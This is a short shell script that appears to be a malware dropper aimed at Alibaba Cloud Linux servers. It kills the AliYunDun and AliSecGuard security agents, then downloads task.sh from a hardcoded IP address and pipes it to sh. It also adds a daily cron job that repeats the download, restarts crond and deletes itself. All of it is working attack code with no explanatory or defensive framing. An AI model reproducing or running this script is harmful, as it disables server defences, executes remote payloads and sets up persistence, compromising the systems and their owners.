#!/bin/sh
killall AliYunDun > /dev/null 2>&1
killall AliSecGuard > /dev/null 2>&1
killall AliYunDunUpdate > /dev/null 2>&1
zero=0
process=`ps aux | grep tcpp | grep -v grep| wc -l`
if [ "$process" -eq "$zero" ]; then
	wget -O - -q http://146.196.83.217:29324/xxgic/task.sh | sh > /dev/null 2>&1
	echo "@daily wget -O - -q http://146.196.83.217:29324/xxgic/task.sh | sh > /dev/null 2>&1" >>/var/spool/cron/`whoami`
	restart crond.service >> /dev/null 2>&1
	/bin/systemctl restart crond.service >> /dev/null 2>&1
else
	echo "runing"
fi
rm -rf run.sh
